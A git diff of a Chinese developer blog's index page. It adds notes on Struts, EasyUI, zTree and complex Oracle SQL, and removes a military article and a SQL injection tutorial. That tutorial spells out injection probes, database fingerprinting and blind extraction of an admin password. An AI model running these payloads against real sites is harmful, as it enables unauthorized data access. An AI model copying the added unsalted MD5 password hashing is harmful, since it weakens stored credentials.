@@ -280,6 +280,588 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://burinicc2.github.io/2016/12/02/二期改造项目笔记/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="burinicc">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/shrimp2.png">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Debug Genie">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Debug Genie" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/12/02/二期改造项目笔记/" itemprop="url">
+                  二期改造项目1
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-02T00:00:00+08:00">
+                2016-12-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/" itemprop="url" rel="index">
+                    <span itemprop="name">Tech</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <a href="/2016/12/02/二期改造项目笔记/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/12/02/二期改造项目笔记/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <p>用pdesigner设计出t_user.pdm,导入数据库,向t_user中插入一条测试用户数据<br>insert into t_user(id,username,password) values(‘1’,’test’,md5(‘123’))<br>这个需要注意的是md5加密。在业务层进行判断时也要把页面传过来的密码进行md5加密和这个密码进行比较，这里我写了一个md5的工具类。代码如下：</p>
+<pre>public static String md5(String plainText) {
+        byte[] secretBytes = null;
+        try {
+            secretBytes = MessageDigest.getInstance("md5").digest(
+                    plainText.getBytes());
+        } catch (NoSuchAlgorithmException e) {
+            throw new RuntimeException("没有md5这个算法！");
+        }
+        String md5code = new BigInteger(1, secretBytes).toString(16);// 16进制数字
+        // 如果生成数字未满32位，需要前面补0
+        for (int i = 0; i < 32 - md5code.length(); i++) {
+            md5code = "0" + md5code;
+        }
+        return md5code;
+    }</pre>
+
+
+<pre><code>自定义一个登录拦截器
+-------------------
+struts只能识别默认的拦截器栈
+        &lt;interceptors&gt;
+        &lt;!-- 注册拦截器 --&gt;
+        &lt;interceptor name=&quot;bosLoginInterceptor&quot; class=&quot;com.itheima.bos.web.interceptor.BOSLoginInterceptor&quot;&gt;
+            &lt;param name=&quot;excludeMethods&quot;&gt;login&lt;/param&gt;
+        &lt;/interceptor&gt;
+        &lt;!-- 拦截器栈 --&gt;
+        &lt;interceptor-stack name=&quot;mystack&quot;&gt;
+                &lt;interceptor-ref name=&quot;bosLoginInterceptor&quot;/&gt;
+                &lt;interceptor-ref name=&quot;defaultStack&quot;/&gt;
+        &lt;/interceptor-stack&gt;
+    &lt;/interceptors&gt;
+    &lt;default-interceptor-ref name=&quot;mystack&quot;/&gt;
+</code></pre><p>页面使用多个样式用空格隔开，例如<br>class=”txt01 easyui-validatebox”</p>
+<pre>
+var v = $("#editPasswordForm").form("validate");//对应表单中的所有输入框进行校验
+if(v){//表单校验通过
+                //判断两次输入是否一致
+                var v1 = $("#txtNewPass").val();
+                var v2 = $("#txtRePass").val();
+                if(v1 == v2){
+                    //输入一致，发送ajax请求，修改当前用户的密码
+                    var url = "${pageContext.request.contextPath}/userAction_editPassword.action";
+                    $.post(url,{"password":v1},function(data){
+                        if(data == '1'){
+                            //修改密码成功
+                            $.messager.alert("提示信息","密码修改成功！","info");
+                        }else{
+                            //修改失败
+                            $.messager.alert("提示信息","密码修改失败！","warning");
+                        }
+                        //关闭修改密码的窗口
+                        $("#editPwdWindow").window("close");
+                    });
+                }else{
+                    //输入不一致，提示用户输入不一致
+                    $.messager.alert("提示信息","两次输入密码不一致！","warning");
+                }
+            }
+</pre>
+在编写dao时遇到了命名查询语句，它就是在对象映射文件domain.hbm.xml中的一个query标签
+<pre>
+&ltquery name=""&gt
+sql语句
+&lt/query&gt
+</pre>
+hibernate模板并没有提供命名语句查询，
+<pre>
+Session session = this.getSession();// 从本地线程中获得session对象
+        // 使用命名查询语句获得一个查询对象
+        Query query = session.getNamedQuery(queryName);
+        // 为HQL语句中的？赋值
+        int i = 0;
+        for (Object arg : objects) {
+            query.setParameter(i++, arg);
+        }
+        query.executeUpdate();// 执行更新
+</pre>
+在action中直接使用提示信息不太合理，改进措施把这些信息放到国际化配置文件中（message.properties)
+ActionSupport类中提供了一个读取配置文件的方法getText("配置文件中的key")在struts.xml中注册这个配置文件的位置，
+<pre>&ltconstant name="struts.custom.i18n.resources" value="message"&gt</pre>
+
+<h2 id="struts提供的错误提示标签"><a href="#struts提供的错误提示标签" class="headerlink" title="struts提供的错误提示标签"></a>struts提供的错误提示标签</h2><pre>&ltfont color="red"&gt
+&lts:actionerror/&gt
+&lt/font&gt</pre>
+
+<h1 id="jQuery-EasyUI在页面使用的规则（具体配置查看API）"><a href="#jQuery-EasyUI在页面使用的规则（具体配置查看API）" class="headerlink" title="jQuery EasyUI在页面使用的规则（具体配置查看API）"></a>jQuery EasyUI在页面使用的规则（具体配置查看API）</h1><hr>
+<p>准备工作，在jsp页面中引入easyUI相关的资源文件</p>
+<p><link rel="stylesheet" type="text/css" href="${pageContext.request.contextPath }/js/easyui/themes/default/easyui.css"/></p>
+<p><link rel="stylesheet" type="text/css" href="${pageContext.request.contextPath }/js/easyui/themes/icon.css" /></p>
+<p><script type="text/javascript" src="${pageContext.request.contextPath }/js/jquery-1.8.3.js"></script ></p>
+<p><script type="text/javascript" src="${pageContext.request.contextPath }/js/easyui/jquery.easyui.min.js"></script ></p>
+<h2 id="layout页面布局"><a href="#layout页面布局" class="headerlink" title="layout页面布局"></a>layout页面布局</h2><p>这个布局容器,有五个区域:北、南、东、西和中心。 他中心地区面板是必需的（特别注意）,但是边缘地区面板是可选的。每一个边缘地区面板可以缩放的拖动其边境, 他们也可以通过点击其收缩触发.布局可以嵌套,从而用户可以建立复杂的布局,他想要的。</p>
+<p>使用规则（重要）<br>在要使用的块状元素中添加class=”easyui-layout”,使用div指定区域使用easyui提供的data-options=”region:’north’”北部区域<br>data-options=”region:’south’”南部区域<br>data-options=”region:’west’”西部区域<br>data-options=”region:’east’”东部区域<br>这时页面显示的效果并不好，要在北部区域和南部区域div加上style=”height：100px”指定高度<br>在西部和东部div加上style=”width：100px”指定高度 在div上加上title属性显示标题，自带折叠效果</p>
+<h2 id="accordion折叠面板"><a href="#accordion折叠面板" class="headerlink" title="accordion折叠面板"></a>accordion折叠面板</h2><p>使用规则（重要）<br>在区域div中加入折叠面板div添加属性class=”easyui-accordion”，添加属性data-options=”fit:true”，表示自动填充区域div，每一个子div就是一个面板，在div上添加title属性显示标题，通常放在西部区域里面。</p>
+<h2 id="tabs选项卡面板"><a href="#tabs选项卡面板" class="headerlink" title="tabs选项卡面板"></a>tabs选项卡面板</h2><p>使用规则（重要）<br>在中部区域加入选项卡面板div添加属性class=”easyui-tabs”，添加属性data-options=”fit:true”，表示自动填充区域div，在子div中，添加性data-options=”closable:true,iconCls:’icon-add’”表示这个div是可关闭的,面板的图标是添加，面板的图标可以到引入的icon.css中找到。</p>
+<h1 id="Ztree树形插件–jQuery插件"><a href="#Ztree树形插件–jQuery插件" class="headerlink" title="Ztree树形插件–jQuery插件"></a>Ztree树形插件–jQuery插件</h1><p>我已经在官网上下载ztree插件，里面包括api<br>在页面导入资源文件</p>
+<p><script type="text/javascript" src="${pageContext.request.contextPath }/js/ztree/jquery.ztree.all-3.5.js"></script></p>
+<p><link rel="stylesheet" href="${pageContext.request.contextPath }/js/ztree/zTreeStyle.css" type="text/css"><br>使用规则（重要）<br>第一种方式：使用标准json数据构成ztree（了解)</p>
+<pre>
+&ltul id="ztree1" class="ztree"&gt&lt/ul&gt
+$(function(){
+                            //当页面加载完成后动态创建菜单
+                            var setting={};//设置标准的ztree属性
+                            //构造json数据
+                            var zNodes=[//每个json数据代表一个节点
+                                                    {
+                                                        name:'系统管理'
+                                                    },
+                                                    {
+                                                        name:'用户管理',children:[{name:'用户添加'},{name:'用户修改'}]
+                                                    },
+                                                    {
+                                                        name:'权限管理'
+                                                    }
+                                                    ];
+                                    //创建ztree
+                                $.fn.zTree.init(
+                                    $("#ztree1"),
+                                    setting,
+                                    zNodes
+                                );
+
+                        });
+</pre>
+
+<p>第二种方式：使用简单json数组数据构成ztree(推荐)<br>在实际开发中我们的节点数据一般来自于系统的业务数据,可以发送ajax请求找action要数据，然后赋给treeNodes</p>
+<pre>
+&ltul id="ztree2" class="ztree"&gt&lt/ul&gt
+$(function(){
+                                //当页面加载完成后动态创建菜单
+                                var setting = {
+                                        data: {
+                                            simpleData: {
+                                                enable: true,//启用简单数组数据
+                                                idKey: "id",
+                                                pIdKey: "pId",
+                                                rootPId: 0
+                                            }
+                                        }
+                                    };
+                                    var treeNodes = [
+                                        {"id":1, "pId":0, "name":"test1"},
+                                        {"id":11, "pId":1, "name":"test11"},
+                                        {"id":12, "pId":1, "name":"test12"},
+                                        {"id":111, "pId":11, "name":"test111"}
+                                    ];
+                                    //创建ztree
+                                    $.fn.zTree.init(
+                                        $("#ztree2"),
+                                        setting,
+                                        treeNodes
+                                    );
+                            });
+
+</pre>
+
+
+
+
+<h2 id="给ztree绑定点击事件"><a href="#给ztree绑定点击事件" class="headerlink" title="给ztree绑定点击事件"></a>给ztree绑定点击事件</h2><pre>
+<code>
+function zTreeOnClick(event, treeId, treeNode) {
+    var page=treeNode.page;
+                    if(page!=undefined){//需要打开选项卡
+                                     //判断当前选项卡是否已经打开
+
+                                    var isExists= $("#tt").tabs("exists",treeNode.name);
+
+                                 if(isExists){
+                                     $("#tt").tabs("select",treeNode.name);
+                                 }else{
+                                     $("#tt").tabs("add",
+                                                {
+                                                 title: treeNode.name,
+                                                content: '&ltiframe src="'+page+'" width="100%" frameborder="0" height="100%"&gt&lt/iframe&gt',
+                                                closable: true,
+                                             iconCls: 'icon-search'
+                                                }  
+                                            );
+                                    }
+                                 }
+};
+var setting = {
+    callback: {
+        onClick: zTreeOnClick
+    }
+};
+</code>
+</pre>
+
+
+<h1 id="jQuery-EasyUI消息提示控件"><a href="#jQuery-EasyUI消息提示控件" class="headerlink" title="jQuery EasyUI消息提示控件"></a>jQuery EasyUI消息提示控件</h1><p>默认的提示框上面的按钮显示为ok，要想显示为中文，需要引入easyui下面locale下面的<br>easyui-lang-zh_CN.js</p>
+<h2 id="alert方法-消息提示框"><a href="#alert方法-消息提示框" class="headerlink" title="alert方法,消息提示框"></a>alert方法,消息提示框</h2><p>$.messager.alert(“标题”,”内容信息”,”question/error/info/warning”);</p>
+<h2 id="show方法-页面右下角出来提示信息"><a href="#show方法-页面右下角出来提示信息" class="headerlink" title="show方法,页面右下角出来提示信息"></a>show方法,页面右下角出来提示信息</h2><pre><code>window.setTimeout(function(){
+            $.messager.show({
+                title:&apos;欢迎信息&apos;,
+                msg:&apos;欢迎张三登录系统&apos;,
+                timeout:3000,
+                showType:&apos;slide&apos;
+            });
+        }, 3000);
+</code></pre><h2 id="confirm方法-确认框-如果点击确定，r的值为true"><a href="#confirm方法-确认框-如果点击确定，r的值为true" class="headerlink" title="confirm方法,确认框,如果点击确定，r的值为true"></a>confirm方法,确认框,如果点击确定，r的值为true</h2><pre><code>$.messager.confirm(&quot;提示信息&quot;,&quot;你确定删除当前数据吗？&quot;,function(r){
+                        alert(r);
+                    });
+</code></pre><h2 id="prompt方法，跟confirm的作用差不多"><a href="#prompt方法，跟confirm的作用差不多" class="headerlink" title="prompt方法，跟confirm的作用差不多"></a>prompt方法，跟confirm的作用差不多</h2><pre><code>$.messager.prompt(&quot;提示信息&quot;,&quot;你确定删除当前数据吗？&quot;,function(r){
+                                    alert(r);
+                                });
+</code></pre><h2 id="progress方法，进度条"><a href="#progress方法，进度条" class="headerlink" title="progress方法，进度条"></a>progress方法，进度条</h2><p>//打开进度条<br>$.messager.progress();<br>//关闭进度条<br>$.messager.progress(‘close’);<br>
+          <!--noindex-->
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/12/02/二期改造项目笔记/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://burinicc2.github.io/2016/12/01/复杂的sql/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="burinicc">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/shrimp2.png">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Debug Genie">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="Debug Genie" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/12/01/复杂的sql/" itemprop="url">
+                  复杂的sql
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-01T20:39:19+08:00">
+                2016-12-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tech/" itemprop="url" rel="index">
+                    <span itemprop="name">Tech</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <a href="/2016/12/01/复杂的sql/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/12/01/复杂的sql/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>做统计分析时，统计每个地区医院的采购金额</p>
+<pre>
+select areainfo.areaname,nvl(business.cgje,0)cgje from
+(select areaname from bss_sys_area where arealevel='2')areainfo left join(
+select sum(nvl(cgje,0))cgje,
+       parentid,
+       (select areaname from bss_sys_area where business.parentid=areaid)areaname from (
+select dq,cgje,
+       (select parentid from bss_sys_area where dq=areaid)parentid
+from (
+select useryyid,
+       (select dq from useryy where useryyid=useryy.id)dq,
+       cgje
+from (
+select useryy.id      useryyid,
+       useryy.mc      useryymc,
+       yycgd.bm       yycgdbm,
+       yycgd.id       yycgdid,
+       usergys.id     usergysid,
+       usergys.mc     usergysmc,
+       yycgdmx.ypxxid,
+       ypxx.id,
+       ypxx.bm,
+       ypxx.mc,
+       ypxx.jx,
+       ypxx.gg,
+       ypxx.zhxs,
+       ypxx.scqymc,
+       ypxx.spmc,
+
+       ypxx.jyzt,
+
+       (select info
+          from dictinfo
+         where ypxx.jyzt = dictcode
+           and typecode = '003') jyztmc,
+       (select info
+          from dictinfo
+         where typecode = '011'
+           and dictcode = yycgdmx.cgzt) cgztmc,
+       yycgdmx.cgl,
+       yycgdmx.cgje,
+       yycgdmx.rkl,
+       yycgdmx.rkje,
+       yycgdmx.thl,
+       yycgdmx.thje,
+       yycgdmx.jsl,
+       yycgdmx.jsje
+
+  from yybusiness2016 yycgdmx, yycgd2016 yycgd, useryy, usergys, ypxx
+ where yycgdmx.yycgdid = yycgd.id
+   and yycgd.useryyid = useryy.id
+   and yycgdmx.usergysid = usergys.id
+   and yycgdmx.ypxxid = ypxx.id)business)business)business group by parentid)business
+on business.areaname=areainfo.areaname</pre>
+
+<p>   下面的sql让我对外连接和内连接以及它们使用的时机有了一个更清楚认识，表的关联需要注意的事项就是一定要保证我们主表在所关联的表只能查到一条记录，这个字段要么不是外键要么就是多个字段构成关联表的唯一约束</p>
+   <pre>select yycgdmx.*,yycgdrk.rkl,
+       yycgdrk.rkje
+        from(
+      select
+        useryy.mc useryymc,
+        yycgd.bm yycgdbm,
+        yycgdmx.yycgdid,
+        yycgdmx.ypxxid,
+        usergys.mc usergysmc,
+        yycgdmx.cgl,
+        yycgdmx.cgje,
+        ypxx.*
+        from yycgdmx2016 yycgdmx,
+             yycgd2016 yycgd,
+             useryy,
+             usergys,
+             ypxx
+             where yycgdmx.yycgdid=yycgd.id
+             and yycgd.useryyid=useryy.id
+             and yycgdmx.ypxxid=ypxx.id
+             and yycgdmx.usergysid=usergys.id
+
+      )yycgdmx
+      （注释)外连接查询入库信息表
+       left join yycgdrk2016 yycgdrk
+      on yycgdmx.yycgdid=yycgdrk.yycgdid
+      and yycgdmx.ypxxid=yycgdrk.ypxxid</pre>
+
+
+<p>总结：在数据库设计时，为了保证数据的完整性，不能把入库量、结算量、退货量、结算金额等重要的业务数据放在yycgdmx中，因为这些信息在创建明细表中根本就不存在，然而这些数据对应的字段不能为空，所以就产生了矛盾。故还应该设计另外一张表来存放这些业务信息yybusiness，考虑到表的数据量也会很大，就写了一个创建表的储存过程，由系统的定时任务来调用。yybusiness中的数据插入时机是监督单位审核后，因为有业务逻辑的判断，使用触发器来插入数据比较复杂，相比较在业务层做这个工作比较方便。当更新yybusiness中的信息的时候，这时触发器会帮助把数据放到自己业务所对应的表中，比如结算流程，对应的yyjsd表。这里使用触发器还帮着实现了数据同步，另外，这样做实际上就是数据聚合。前段时间，一个同学问我数据聚合，当时把我问的一头雾水，现在想想还觉的脸红。其实，它就是为了我们方便操作数据，这里的操作主要是查询，你想想看，数据结构中，数组为什么比链表好查。其实是一个道理。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
   <link itemprop="mainEntityOfPage" href="http://burinicc2.github.io/2016/12/01/向maven私服中导入jar包/">
 
   <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -437,339 +1019,11 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://burinicc2.github.io/2016/12/01/朱日和介绍/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="burinicc">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/shrimp2.png">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Debug Genie">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="Debug Genie" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/12/01/朱日和介绍/" itemprop="url">
-                  神秘的“朱日和”
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-01T18:04:37+08:00">
-                2016-12-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-              <span class="post-meta-divider">|</span>
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/military/" itemprop="url" rel="index">
-                    <span itemprop="name">military</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <a href="/2016/12/01/朱日和介绍/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/12/01/朱日和介绍/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <img src="/images/zrh.png" width="380" height="480">
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;三界：全军首个训练基地 、朱日和：科技含量最高、确山：唯一特种作战训练场。确山曾经去过两次，规模宏达，很征服人心。所以对三界和朱日和这两大军事训练基地充满了无限的向往。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;朱日和训练基地势必是今年最吸引外界目光的军事训练场地。从6月份到9月份，连续举行了三场声势浩大的实兵演习。最先是持续两个月、用兵数万人的“跨越-2014·朱日和”实兵对抗系列演习，然后是8月末“和平使命—2014”上海合作组织成员国武装力量联合反恐实兵演习，最近的是首次信息化条件下实兵对抗卫勤保障演习“卫勤使命—2014”。　朱日和训练基地隶属北京军区，距离北京数百公里，位于内蒙古草原的锡林郭勒盟。其前身是某装甲兵训练场。据《解放军报》报道，1999年7月，为适应未来高技术战争的需要，中央军委决定将该训练场扩编成全军规模最大、科技含量最高、现代化程度最高的合同战术训练基地。2011年军委、总部决定将朱日和训练基地建成全军唯一陆军联合作战实验场。国防部网站的一篇文章将朱日和基地描绘为“全亚洲最大、解放军最先进的训练基地，也被称为‘中国欧文堡’”。朱日和训练基地由沙漠、草原、山地、壕沟等组成，占地1,066平方公里，与香港面积差不多。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7月15日起，代号为“跨越-2016·朱日和”的陆军跨战区实兵检验性对抗演习，在位于内蒙古的朱日和训练基地展开。来自5个战区陆军的5支陆军合成旅将参加今年的演习，7月至9月底，他们会与我军首支陆军专业化模拟蓝军部队展开实兵对抗。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7月19日，红军坦克在对坚固目标实施打击。当日，“跨越－2016·朱日和Ａ”演习开始进入实兵对抗阵地进攻战。“朱日和”系列演习是我军年度性的重大演习，对于检验战备状况，研究未来战争模式，解放军军改方向等都指导意义，堪称“年度大考”。据报道，今年的演习将改为“蓝军”进攻， “红军”防守的新模式。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;看得出，这是一处绝佳的战场。的确，整整800年前，成吉思汗的铁骑由此扬鞭远征，横扫亚欧；300多年前，康熙皇帝御驾亲征，经此征讨准噶尔叛军。如今，这片广袤的古战场崛起为一座现代化的军事训练基地。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://burinicc2.github.io/2016/12/01/sql注入问题详解/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="burinicc">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="/images/shrimp2.png">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Debug Genie">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="Debug Genie" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/12/01/sql注入问题详解/" itemprop="url">
-                  sql注入问题详解
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-01T11:23:39+08:00">
-                2016-12-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-              <span class="post-meta-divider">|</span>
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Tech/" itemprop="url" rel="index">
-                    <span itemprop="name">Tech</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <a href="/2016/12/01/sql注入问题详解/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/12/01/sql注入问题详解/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。<br>SQL注入基础<br>1.试探 1=1，1=2</p>
-<pre><code>http://example.asp?id=49
-http://example.asp?id=49 and 1=1
-http://example.asp?id=49 and 1=2
-</code></pre><p>可以注入的表现：</p>
-<pre><code>正常显示
-正常显示
-提示BOF或EOF
-</code></pre><p>不可注入的表现：</p>
-<pre><code>正常显示
-程序定义的错误提示或提示类型转换时出错。
-同上
-</code></pre><p>2.判断数据库类型<br>加单引号</p>
-<pre><code>错误提示含有JET（JET是ACCESS数据库的数据库引擎）
-错误提示中含有OLEDB（OLEDB是SQL SERVER使用的数据库引擎）
-</code></pre><p>and user &gt; 0</p>
-<p>SQL SERVER出错：将nvarchar值“abc”转换数据类型为int的列时发生语法错误；“abc”正是变量user的值。SQL SERVER中有一个内置变量user，变量类型为nvarchar。</p>
-<p>ACCESS的系统表[msysobjects]在web环境下读该表会提示“没有权限”；SQL SERVER的系统表[sysobjects]在web环境下不可正常读取。<br>and (select count (*) from sysobjects) &gt; 0</p>
-<p>SQL SERVER显示正常。ACCESS显示出错。<br>and (select count (*) from msysobjects) &gt; 0</p>
-<p>SQL SERVER显示正常。ACCESS显示没有权限。<br>3.猜表名</p>
-<p>and (select count (*) from admin) &gt;= 0<br>返回正常说明admin存在<br>4.猜字段</p>
-<p>and (select count (content) from admin) &gt;= 0<br>返回正常说明content字段存在</p>
-<p>常用的猜字段函数<br>ACCESS: asc(字符) 返回字符的ascii<br>MSSQL: unicode(字符) 同上<br>ACCESS: char(数字) 返回ascii的字符<br>MSSQL: nchar()同上<br>ACCESS: mid(字符串,N,L) 返回字符串从N个字符起，长度为L的子字符串<br>MSSQL: substring(字符串,N,L) 同上<br>ACCESS,MSSQL: abc(数字) 返回数字的绝对值（猜汉字使用）<br>ACCESS,MSSQL: A between B and C 判断A是否在B和C之间</p>
-<p>例and (select asc(mind(password,1,1))from admin) &gt; 100<br>查询admin中password字段第1个字符串的ascii是否大于100</p>
-<p>例select <em> from article where articleid = ‘’ union select </em> from user where userid = 1<br>第一个select执行后返回结果title content<br>select <em> from article where articleid = ‘’<br>第二个select执行后返回结果username password<br>select </em> from user where userid = 1<br>整个select执行后返回结果username password<br>如果前面查询为真，则同时返回两次查询的内容</p>
-<pre><code>判断字段个数order by
-查表名and (select count (*) from admin) &gt;= 0
-猜测admin表的字段个数（假如有三个字段id,user,password）union select 1,2,3,4,5,6,7,8,9,10,* from admin返回错误，union select 1,2,3,* from admin返回正常
-</code></pre><p>inner join on: 指定返回两个表中匹配的行<br>select * from admin as a inner join admin as b on a.id = b.id返回一个表中的两个内容</p>
